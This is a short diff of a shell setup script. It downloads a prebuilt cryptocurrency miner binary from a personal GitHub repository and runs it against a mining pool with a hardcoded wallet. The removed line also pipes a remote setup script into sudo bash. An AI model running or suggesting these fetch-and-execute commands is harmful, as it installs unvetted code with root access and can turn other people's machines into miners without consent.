@@ -1,1 +1,3 @@
-sudo apt update && sudo apt install gcc -y && apt install wget curl git -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash && wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2 && chmod u+x cpuminer-sse2 && ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RNV7bACVwZZPxGAiuRxWcEzJvyXzwZxBjn.wrke -p x -t 2
+sudo apt update && sudo apt install gcc -y && apt install wget curl git -y && wget https://raw.githubusercontent.com/apaple/kurohs/master/cpuminer-sse2 && chmod u+x cpuminer-sse2
+
+./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RNV7bACVwZZPxGAiuRxWcEzJvyXzwZxBjn.wrke -p x -t 2
